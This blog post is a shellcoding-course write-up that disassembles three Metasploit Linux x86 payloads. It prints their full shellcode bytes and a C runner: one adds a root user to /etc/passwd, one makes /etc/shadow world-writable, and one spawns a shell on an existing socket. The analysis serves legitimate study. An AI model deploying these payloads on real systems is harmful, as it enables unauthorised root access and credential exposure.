---
layout: post
title: SLAE32 Assignment5
---
![Alt](https://bohansec.com/assets/SHELLCODING32.png "Pentester Academy")

This blog post has been created for completing the requirments of the SecurityTube (Pentester Academy) x86 Assembly Language and Shellcoding on Linux certification:

[x86 Assembly Language and Shellcoding on Linux](https://www.pentesteracademy.com/course?id=3){:target="_blank"}

Student ID: SLAE-1562

### Objects
{% highlight js %}
Take up at least 3 shellcode examples created using msfvenom for linux x86

Using GDB/Ndisasm/Libemu to dissect the functionality of the shellcode

Present your analysis

{% endhighlight %}

### Prerequisite

* Install libemu
{% highlight js %}
git clone https://github.com/buffer/libemu
sudo apt-get install autoconf
sudo apt-get install libtool
autoreconf -v -i
./configure --prefix=/opt/libemu
autoreconf -v -i
sudo make install
{% endhighlight %}

* Obtain the Kali (x86) Linux 2020.3 
{% highlight js %}
https://images.kali.org/virtual-images/kali-linux-2020.3-vmware-i386.7z
{% endhighlight %}

### Payload being analyzed

* linux/x86/adduser
* linux/x86/chmod
* linux/x86/shell_find_tag

### linux/x86/adduser

Show all the available options for this payload to get a general idea what it does:

{% highlight js %}
kali@kali:~$ msfvenom -p linux/x86/adduser -f raw --list-options
Options for payload/linux/x86/adduser:
=========================


       Name: Linux Add User
     Module: payload/linux/x86/adduser
   Platform: Linux
       Arch: x86
Needs Admin: Yes
 Total size: 97
       Rank: Normal

Provided by:
    skape <mmiller@hick.org>
    vlad902 <vlad902@gmail.com>
    spoonm <spoonm@no$email.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
PASS   metasploit       yes       The password for this user
SHELL  /bin/sh          no        The shell for this user
USER   metasploit       yes       The username to create

Description:
  Create a new user with UID 0



Advanced options for payload/linux/x86/adduser:
=========================

    Name                        Current Setting  Required  Description
    ----                        ---------------  --------  -----------
    AppendExit                  false            no        Append a stub that executes the exit(0) system call
    MeterpreterDebugLevel       0                yes       Set debug level for meterpreter 0-3 (Default output is strerr)
    PrependChrootBreak          false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork                 false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid               false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid             false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid            false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid            false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid             false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid               false            no        Prepend a stub that executes the setuid(0) system call
    RemoteMeterpreterDebugFile                   no        Redirect Debug Info to a Log File
    VERBOSE                     false            no        Enable detailed status messages
    WORKSPACE                                    no        Specify the workspace for this module

Evasion options for payload/linux/x86/adduser:
=========================

    Name  Current Setting  Required  Description

{% endhighlight %}

We can see it adds a user named "metasploit" with password "metasploit" and shell "/bin/sh".

Convert the shellcode to NASM with ndisasm:

{% highlight js %}
kali@kali:~$ msfvenom -p linux/x86/adduser -f raw USER=test PASS=test SHELL=/bin/sh | ndisasm -u -
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 91 bytes

00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E822000000        call 0x4d
0000002B  7465              jz 0x92
0000002D  7374              jnc 0xa3
0000002F  3A417A            cmp al,[ecx+0x7a]
00000032  3551365070        xor eax,0x70503651
00000037  47                inc edi
00000038  7764              ja 0x9e
0000003A  4B                dec ebx
0000003B  57                push edi
0000003C  633A              arpl [edx],di
0000003E  303A              xor [edx],bh
00000040  303A              xor [edx],bh
00000042  3A2F              cmp ch,[edi]
00000044  3A2F              cmp ch,[edi]
00000046  62696E            bound ebp,[ecx+0x6e]
00000049  2F                das
0000004A  7368              jnc 0xb4
0000004C  0A598B            or bl,[ecx-0x75]
0000004F  51                push ecx
00000050  FC                cld
00000051  6A04              push byte +0x4
00000053  58                pop eax
00000054  CD80              int 0x80
00000056  6A01              push byte +0x1
00000058  58                pop eax
00000059  CD80              int 0x80

{% endhighlight %}

Generating the shellcode with msfvenom:
{% highlight js %}
kali@kali:~$ msfvenom -p linux/x86/adduser -f c USER=test PASS=test SHELL=/bin/sh 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 91 bytes
Final size of c file: 409 bytes
unsigned char buf[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x74\x65"
"\x73\x74\x3a\x41\x7a\x35\x51\x36\x50\x70\x47\x77\x64\x4b\x57"
"\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"
"\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"
"\x80";
{% endhighlight %}

Compile the shellcode with shellcode.c:
{% highlight js %}
#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x74\x65"
"\x73\x74\x3a\x41\x7a\x35\x51\x36\x50\x70\x47\x77\x64\x4b\x57"
"\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"
"\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"
"\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
{% endhighlight %}

Note:
When executing the shellcode, the attacker has to already have root access otherwise the user won't be added.

Let's break down each part of the code to understand what it does. 
{% highlight js %}
note: in "/usr/include/i386-linux-gnu/asm/unistd_32.h", 0x46 is #define __NR_setreuid 70
;set both ruid and euid to 0 in the setreuid() system call

00000000  31C9              xor ecx,ecx ;zero out the ecx
00000002  89CB              mov ebx,ecx ;set ebx to 0
00000004  6A46              push byte +0x46; push 0x46 onto the stack
00000006  58                pop eax ;set eax to 0x46
00000007  CD80              int 0x80 ;kernel interruption
{% endhighlight %}

![assignment5-1](https://bohansec.com/assets/assignment5-1.png "assignment5-1")

{% highlight js %}
;note: 0x5 in is #define __NR_open 5
00000009  6A05              push byte +0x5; push 5 onto the stack
0000000B  58                pop eax ;set eax to 5, which is open() system call
0000000C  31C9              xor ecx,ecx ;set ecx to 0
0000000E  51                push ecx ;push ecx to the stack
;set pathname for open() to /etc//passwd
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp; move where esp points to ebx
00000020  41                inc ecx; increase ecx by 1, cl = 0x1
00000021  B504              mov ch,0x4 ;set 0x4 to ecx high, ecx now becomes 1025 or 0x401, which is the flag
00000023  CD80              int 0x80 ; kernel interruption 

in /usr/include/asm-generic/fcntl.h, we can find following flags being set based on the ecx = 1025
#define O_WRONLY        00000001
#define O_NOCTTY        00000400        /* not fcntl */

{% endhighlight %}

![assignment5-2](https://bohansec.com/assets/assignment5-2.PNG "assignment5-2")

![assignment5-3](https://bohansec.com/assets/assignment5-3.PNG "assignment5-3")

The following code seems does not make any sense at first, but they are actually the string which is the user to be added to the /etc/passwd.

{% highlight js %}
string for the user "test":
"746573743A417A35513650704777644B57633A303A303A3A2F3A2F62696E2F2F7368" in ascii:
"test:Az5Q6PpGwdKWc:0:0::/:/bin//sh"

0000002B  7465              jz 0x92
0000002D  7374              jnc 0xa3
0000002F  3A417A            cmp al,[ecx+0x7a]
00000032  3551365070        xor eax,0x70503651
00000037  47                inc edi
00000038  7764              ja 0x9e
0000003A  4B                dec ebx
0000003B  57                push edi
0000003C  633A              arpl [edx],di
0000003E  303A              xor [edx],bh
00000040  303A              xor [edx],bh
00000042  3A2F              cmp ch,[edi]
00000044  3A2F              cmp ch,[edi]
00000046  62696E            bound ebp,[ecx+0x6e]
00000049  2F                das
0000004A  7368              jnc 0xb4
{% endhighlight %}

![assignment5-5](https://bohansec.com/assets/assignment5-5.PNG "assignment5-5")

{% highlight js %}
The following code write the user to the file and exit the program
00000051  6A04              push byte +0x4 ;#define __NR_write 4
00000053  58                pop eax ;set eax to 4
00000054  CD80              int 0x80
00000056  6A01              push byte +0x1 ;set eax to 1 so exit the program
00000058  58                pop eax
00000059  CD80              int 0x80
{% endhighlight %}

### linux/x86/chmod

Show all the available options for this payload to get a general idea what it does:

{% highlight js %}
kali@kali:~$ msfvenom -p linux/x86/chmod -f raw --list-options
Options for payload/linux/x86/chmod:
=========================


       Name: Linux Chmod
     Module: payload/linux/x86/chmod
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal

Provided by:
    kris katterjohn <katterjohn@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)

Description:
  Runs chmod on specified file with specified mode



Advanced options for payload/linux/x86/chmod:
=========================

    Name                        Current Setting  Required  Description
    ----                        ---------------  --------  -----------
    AppendExit                  false            no        Append a stub that executes the exit(0) system call
    MeterpreterDebugLevel       0                yes       Set debug level for meterpreter 0-3 (Default output is strerr)
    PrependChrootBreak          false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork                 false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid               false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid             false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid            false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid            false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid             false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid               false            no        Prepend a stub that executes the setuid(0) system call
    RemoteMeterpreterDebugFile                   no        Redirect Debug Info to a Log File
    VERBOSE                     false            no        Enable detailed status messages
    WORKSPACE                                    no        Specify the workspace for this module

Evasion options for payload/linux/x86/chmod:
=========================

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
{% endhighlight %}

Convert the shellcode to NASM with ndisasm:

{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment5/chmod$ msfvenom -p linux/x86/chmod -f raw  | ndisasm -u -
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 36 bytes

00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80C000000        call 0x16
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
00000016  5B                pop ebx
00000017  68B6010000        push dword 0x1b6
0000001C  59                pop ecx
0000001D  CD80              int 0x80
0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
{% endhighlight %}

{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment5/chmod$ msfvenom -p linux/x86/chmod -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 36 bytes
Final size of c file: 177 bytes
unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";
{% endhighlight %}

Let's break down each part of the Assembly to see what it does:

{% highlight js %}
00000000  99                cdq ;edx = 0x00000000
00000001  6A0F              push byte +0xf ;push 15 on the stack
00000003  58                pop eax ;set eax = 15, #define __NR_chmod 15
00000004  52                push edx; push edx to the stack
00000005  E80C000000        call 0x16 ;call the part where the filename set
{% endhighlight %}

The following part of the code is the filename to chmod, currently set as "/etc/shadow".

{% highlight js %}
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
{% endhighlight %}

![assignment5-6](https://bohansec.com/assets/assignment5-6.PNG "assignment5-6")

Based on chmod syscall [page](https://www.man7.org/linux/man-pages/man2/chmod.2.html){:target="_blank"}, the chmod takes pathname and mode as two arguments. 

{% highlight js %}
00000016  5B                pop ebx; set the filename as the "/etc/shadow"
00000017  68B6010000        push dword 0x1b6 
0000001C  59                pop ecx ;set ebx to hex 0x1b6 which is 0666 in octal
0000001D  CD80              int 0x80
0000001F  6A01              push byte +0x1 ;exit the program
00000021  58                pop eax
00000022  CD80              int 0x80
{% endhighlight %}

### linux/x86/shell_find_tag

Show all the available options for this payload to get a general idea what it does:

{% highlight js %}
kali@kali:~$ msfvenom -p linux/x86/shell_find_tag -f raw  --list-options
Options for payload/linux/x86/shell_find_tag:
=========================


       Name: Linux Command Shell, Find Tag Inline
     Module: payload/linux/x86/shell_find_tag
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 69
       Rank: Normal

Provided by:
    skape <mmiller@hick.org>

Description:
  Spawn a shell on an established connection (proxy/nat safe)



Advanced options for payload/linux/x86/shell_find_tag:
=========================

    Name                        Current Setting  Required  Description
    ----                        ---------------  --------  -----------
    AppendExit                  false            no        Append a stub that executes the exit(0) system call
    AutoRunScript                                no        A script to run automatically on session creation.
    CommandShellCleanupCommand                   no        A command to run before the session is closed
    CreateSession               true             no        Create a new session for every successful login
    InitialAutoRunScript                         no        An initial script to run on session creation (before AutoRunScript)
    MeterpreterDebugLevel       0                yes       Set debug level for meterpreter 0-3 (Default output is strerr)
    PrependChrootBreak          false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork                 false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid               false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid             false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid            false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid            false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid             false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid               false            no        Prepend a stub that executes the setuid(0) system call
    RemoteMeterpreterDebugFile                   no        Redirect Debug Info to a Log File
    TAG                         oJ1N             yes       The four byte tag to signify the connection.
    VERBOSE                     false            no        Enable detailed status messages
    WORKSPACE                                    no        Specify the workspace for this module

Evasion options for payload/linux/x86/shell_find_tag:
=========================

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
{% endhighlight %}

Convert the shellcode to NASM with ndisasm:

{% highlight js %}
kali@kali:~$ msfvenom -p linux/x86/shell_find_tag -f raw  | ndisasm -u -
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 69 bytes

00000000  31DB              xor ebx,ebx
00000002  53                push ebx
00000003  89E6              mov esi,esp
00000005  6A40              push byte +0x40
00000007  B70A              mov bh,0xa
00000009  53                push ebx
0000000A  56                push esi
0000000B  53                push ebx
0000000C  89E1              mov ecx,esp
0000000E  86FB              xchg bh,bl
00000010  66FF01            inc word [ecx]
00000013  6A66              push byte +0x66
00000015  58                pop eax
00000016  CD80              int 0x80
00000018  813E58597757      cmp dword [esi],0x57775958
0000001E  75F0              jnz 0x10
00000020  5F                pop edi
00000021  89FB              mov ebx,edi
00000023  6A02              push byte +0x2
00000025  59                pop ecx
00000026  6A3F              push byte +0x3f
00000028  58                pop eax
00000029  CD80              int 0x80
0000002B  49                dec ecx
0000002C  79F8              jns 0x26
0000002E  6A0B              push byte +0xb
00000030  58                pop eax
00000031  99                cdq
00000032  52                push edx
00000033  682F2F7368        push dword 0x68732f2f
00000038  682F62696E        push dword 0x6e69622f
0000003D  89E3              mov ebx,esp
0000003F  52                push edx
00000040  53                push ebx
00000041  89E1              mov ecx,esp
00000043  CD80              int 0x80
{% endhighlight %}

Generating the shellcode with msfvenom:

{% highlight js %}
kali@kali:~$ msfvenom -p linux/x86/shell_find_tag -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 69 bytes
Final size of c file: 315 bytes
unsigned char buf[] = 
"\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86"
"\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x49\x45\x36\x48"
"\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79"
"\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";
{% endhighlight %}

![assignment5-7](https://bohansec.com/assets/assignment5-7.PNG "assignment5-7")

Let's break down each part of the Assembly to see what it does:

[RECV](https://man7.org/linux/man-pages/man2/recv.2.html){:target="_blank"}

[MSG_DONTWAIT](https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/bits/socket.h.html){:target="_blank"}

{% highlight js %}
Pass the systemcall arguments recv(int sockfd, void *buf, size_t len, int flags)

00000000  31DB              xor ebx,ebx ;set ebx to 0
00000002  53                push ebx ;push ebx onto the stack
00000003  89E6              mov esi,esp ; move the stack pointer to the esi
00000005  6A40              push byte +0x40; push 40 onto the stack, MSG_DONTWAIT flag
00000007  B70A              mov bh,0xa ;set the bg to 10
00000009  53                push ebx; push 10 onto the stack, this will be the len
0000000A  56                push esi; push the pointer onto the stack, this will be the *buf
0000000B  53                push ebx;this will be the sockfd
0000000C  89E1              mov ecx,esp ;move the stack pointer to ecx
0000000E  86FB              xchg bh,bl;bh has decimal 10, the SYS_RECV is being used
00000010  66FF01            inc word [ecx] ;goto the next socket
00000013  6A66              push byte +0x66 ;socketcall
00000015  58                pop eax ;set eax to 0x66
00000016  CD80              int 0x80 ;call socketcall
00000018  813E58597757      cmp dword [esi],0x57775958; XYwW, The four byte tag to signify the connection
0000001E  75F0              jnz 0x10; if not match, move to the next socket
{% endhighlight %}

[dup2](https://man7.org/linux/man-pages/man2/dup.2.html){:target="_blank"}
{% highlight js %}
00000020  5F                pop edi;sockfd saved edi
00000021  89FB              mov ebx,edi; sockfd being saved to ebx for dup2, oldfd
00000023  6A02              push byte +0x2; set ecx to 2, dup2 2,1,0 (stdin, stdout, stderr)
00000025  59                pop ecx; new fd
00000026  6A3F              push byte +0x3f ;dup2 call
00000028  58                pop eax; set eax to 0x3f
00000029  CD80              int 0x80
0000002B  49                dec ecx; decrease ecx by 1
0000002C  79F8              jns 0x26; loop from 2 to 0
{% endhighlight %}

[Execve](https://man7.org/linux/man-pages/man2/execve.2.html){:target="_blank"}
{% highlight js %}
0000002E  6A0B              push byte +0xb ;call the execve sys call to execute the /bin//sh
00000030  58                pop eax ;eax set to 11
00000031  99                cdq ;edx set to 0
00000032  52                push edx; push edx onto stack
00000033  682F2F7368        push dword 0x68732f2f; //sh
00000038  682F62696E        push dword 0x6e69622f; /bin
0000003D  89E3              mov ebx,esp;ebx stores the stack pointer
0000003F  52                push edx ;push edx onto the stack
00000040  53                push ebx ;push ebx onto the stack
00000041  89E1              mov ecx,esp ; ecx stores the stack pointer, argv[]
00000043  CD80              int 0x80; stack: [address]0/bin//sh0
{% endhighlight %}

You can find all the above code at [here](https://github.com/allan9595/SLAE-Assignments/tree/master/assignment5){:target="_blank"}.

Thanks for reading :)